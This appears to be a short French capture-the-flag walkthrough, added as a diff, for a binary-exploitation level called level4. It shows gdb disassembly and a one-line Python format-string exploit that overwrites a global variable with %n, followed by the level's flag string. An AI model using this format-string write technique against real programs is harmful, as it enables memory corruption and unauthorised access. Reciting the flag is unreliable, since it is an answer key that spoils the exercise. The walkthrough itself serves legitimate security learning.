@@ -1,0 +1,13 @@
+Via gdb level03, on peut constater 3 fonctions, "main", "n" et "p",
+meme principe que pour le level3 donc sauf que ce coup ci l'addresse a ecraser est 0x8049810
+
+   0x0804848d <+54>:	mov    0x8049810,%eax
+
+on voit une comparaison avec un nombre en dur dans le code:
+   0x08048492 <+59>:	cmp    $0x1025544,%eax
+
+qui vaut donc: 16930112c
+
+python -c "print('\x08\x04\x98\x10'[::-1] + '%16930112c'+ '%12\$n')" | ./level4
+
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
